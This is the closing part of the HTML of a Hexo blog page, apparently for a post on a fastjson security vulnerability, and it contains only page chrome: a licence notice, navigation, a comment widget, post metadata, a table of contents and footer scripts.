+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/11/21/hexo博客部署到github/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"Cbgk0YxBpLhiX5GAO3blh1dL-gzGzoHsz","appKey":"sXGSZcQ400OknswrtdEDSiTp","placeholder":"","visitor":false,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":false}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "false",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-12-06 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/java/">java<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/security/">security<span>1</span></a></li> <li><a href="/tags/fastjson/">fastjson<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-article-text">前言</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-article-text">漏洞复现</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-article-text">漏洞分析</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#cache"><span class="toc-article-text">cache</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#read"><span class="toc-article-text">read</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#write"><span class="toc-article-text">write</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#write2RCE"><span class="toc-article-text">write2RCE</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-article-text">后记</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 ph0ebus's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
